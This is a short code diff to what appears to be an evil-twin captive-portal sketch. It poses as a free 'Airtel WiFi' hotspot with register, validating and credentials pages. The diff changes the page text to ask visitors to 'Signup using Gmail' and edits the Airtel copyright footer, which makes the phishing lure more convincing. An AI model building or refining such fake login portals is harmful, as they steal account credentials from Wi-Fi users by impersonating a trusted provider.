@@ -5,7 +5,7 @@
 #define SSID_NAME "Airtel WiFi"
 #define SUBTITLE "Airtel Free WiFi"
 #define TITLE "Register:"
-#define BODY "Create an account to get connected to the internet."
+#define BODY "Signup using Gmail to get connected to the internet."
 #define POST_TITLE "Validating..."
 #define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
 #define PASS_TITLE "Credentials"
@@ -25,7 +25,7 @@ String input(String argName) {
   a.substring(0,200); return a; }
 
 String footer() { return 
-  "</div><div class=q><a>&#169; Airtel India 2020.</a></div>";
+  "</div><div class=q><a>&#169; Airtel 2020.</a></div>";
 }
 
 String header(String t) {
